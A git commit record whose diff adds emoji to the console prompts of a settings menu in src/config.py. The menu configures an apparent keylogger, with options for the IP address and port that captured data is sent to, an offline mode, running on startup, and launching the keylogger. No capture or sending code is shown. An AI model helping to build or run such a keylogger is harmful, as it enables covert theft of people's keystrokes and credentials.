b2190f1e592f7008d03616ef5cdac4fc96ba9a73
IlGabbo <f.mancini.gabriele@gmail.com>
2023-03-19 15:47:40 +0100

    emoji added

--- src/config.py
+++ src/config.py
@@ -64,7 +64,7 @@ def toRunOnStartup():
         else:
             return False
     except json.decoder.JSONDecodeError:
-        print(f"{Colors.red}[!] An error occurred when reading the settings, did you change anything?{Colors.white}")
+        print(f"{Colors.red}[!] An error occurred when reading the settings, did you change anything? \U0001F914 {Colors.white}")
         exit(-1)
 
 
@@ -84,17 +84,17 @@ if __name__ == "__main__":
             writeSettings()
 
         if toRunOnStartup():
-            print(f"{Colors.red}[!] Not enabled to launch the settings window")
-            print(f"{Colors.orange}[i] If you want to change this setting, open the 'settings.json' file and change the 'runOnStartup' option to true{Colors.white}")
+            print(f"{Colors.red}[!] Not enabled to launch the settings window \U0001F610")
+            print(f"{Colors.orange}[i] If you want to change this setting, open the 'settings.json' file and change the 'runOnStartup' option to true \U0001F642 {Colors.white}")
             break
 
         text = f"""        
-{Colors.blue}[0] Timeout when sending data (default 10s)
-{Colors.yellow}[1] IP address (default 0.0.0.0)
-{Colors.orange}[2] Port (default 1024)
-{Colors.cyan}[3] Offline keylogger (default 0)
-{Colors.gray}[4] Run this window on application startup (default 1)
-{Colors.purple}[5] Close settings and run the keylogger
+{Colors.blue}[0] Timeout when sending data (default 10s) \U0001F55B	
+{Colors.yellow}[1] IP address (default 0.0.0.0) \U0001F51F	
+{Colors.orange}[2] Port (default 1024) \U0001F51F		
+{Colors.cyan}[3] Offline keylogger (default 0) \U0001F6AB
+{Colors.gray}[4] Run this window on application startup (default 1) \U0001F44D	
+{Colors.purple}[5] Close settings and run the keylogger \U0000274C
 
 {Colors.white}[Enter] Exit{Colors.white}
 > """
@@ -113,15 +113,15 @@ if __name__ == "__main__":
             if choice == "0":
                 timeout = input("Timeout (s): ")
                 if editSettings(choice, int(timeout)):
-                    print(f"{Colors.green}Success{Colors.white}")
+                    print(f"{Colors.green}Success{Colors.white} \U0001F919")
             elif choice == "1":
                 ipaddress = input("Enter ip address: ")
                 if editSettings(choice, ipaddress):
-                    print(f"{Colors.green}Success{Colors.white}")
+                    print(f"{Colors.green}Success{Colors.white} \U0001F919")
             elif choice == "2":
                 port = input("Enter a port: ")
                 if editSettings(choice, int(port)):
-                    print(f"{Colors.green}Success{Colors.white}")
+                    print(f"{Colors.green}Success{Colors.white} \U0001F919")
             elif choice == "3":
                 if choices():
                     offlinekl = True
@@ -129,7 +129,7 @@ if __name__ == "__main__":
                     offlinekl = False
 
                 if editSettings(choice, offlinekl):
-                    print(f"{Colors.green}Success{Colors.white}")
+                    print(f"{Colors.green}Success{Colors.white} \U0001F919")
             elif choice == "4":
                 if choices():
                     runOnStartup = True
@@ -137,7 +137,7 @@ if __name__ == "__main__":
                     runOnStartup = False
 
                 if editSettings(choice, runOnStartup):
-                    print(f"{Colors.green}Success{Colors.white}")
+                    print(f"{Colors.green}Success{Colors.white} \U0001F919")
 
             time.sleep(2)
 
